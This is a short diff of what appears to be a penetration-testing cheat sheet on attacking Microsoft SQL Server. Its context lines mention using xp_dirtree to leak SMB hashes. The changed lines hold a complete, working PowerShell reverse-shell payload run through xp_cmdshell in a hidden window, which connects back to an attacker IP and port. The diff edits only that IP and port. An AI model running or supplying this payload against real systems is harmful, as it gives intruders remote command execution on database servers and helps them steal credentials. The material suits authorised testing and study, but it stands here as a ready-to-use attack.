@@ -88,6 +88,6 @@ SELECT SYSTEM_USER, SESSION_USER, USER_NAME();
 With access to the sql shell `xp_dirtree {path}` can be utilized to send an SMB request which can reveal hashes.
 
 ```
-EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.10'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"';
+EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.133'',1111);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"';
 
 ```
